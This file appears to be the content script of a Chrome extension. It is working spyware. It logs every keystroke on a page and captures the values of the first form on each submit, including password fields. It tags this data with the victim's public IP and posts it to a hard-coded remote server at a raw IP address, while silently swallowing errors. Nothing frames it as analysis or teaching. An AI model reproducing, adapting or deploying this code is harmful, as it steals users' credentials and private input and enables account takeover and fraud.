var keyQueue = [];
var processingKeys = false;

window.onkeydown = function(event) {
    var k = "";
    if(event.key != undefined) {
        if (event.key.length > 1) {
            k = " (" + event.key + ") ";
        } else {
            k = event.key;
        }
        keyQueue.push(k);
        processKeys();
    }
};

if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
    document.addEventListener('submit', async function(event) {
        var form = getFormData();
        try {
            const ip = await getIPAddress();
            const formData = getFormData();
            const data = {
                key: "",
                page: window.location.href,
                formdata: formData,
                ip: ip || "Unknown IP"
            };
            await sendMessageToBackground(data);
            await sendToServer(data);
        } catch (error) {
        }
    });
}

async function processKeys() {
    if (processingKeys) return;
    processingKeys = true;

    while (keyQueue.length > 0) {
        var k = keyQueue.shift();
        try {
            const ip = await getIPAddress();
            const data = {
                key: k,
                page: window.location.href,
                formdata: "",
                ip: ip || "Unknown IP"
            };
            await sendMessageToBackground(data);
            await sendToServer(data);
        } catch (error) {
        }
    }

    processingKeys = false;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return '';
    }
}

function getFormData() {
    var formData = {};
    formData["url"] = window.location.href;
    var formElements = document.forms[0].elements;
    for (var i = 0; i < formElements.length; i++) {
        var element = formElements[i];
        if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.tagName === 'SELECT') {
            formData[element.name] = element.value;
        }
    }
    delete formData['execution'];
    return JSON.stringify(formData);
}

async function sendMessageToBackground(data) {
    return new Promise((resolve, reject) => {
        if (chrome.runtime && chrome.runtime.sendMessage) {
            chrome.runtime.sendMessage(data, function(response) {
                if (!chrome.runtime.lastError) {
                    resolve();
                } else {
                    reject(chrome.runtime.lastError);
                }
            });
        } else {
            resolve();
        }
    });
}

async function sendToServer(data) {
    try {
        const response = await fetch('http://163.5.143.146:3000/data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
        if (!response.ok) {
            throw new Error('Failed to send data to server');
        }
    } catch (error) {
    }
}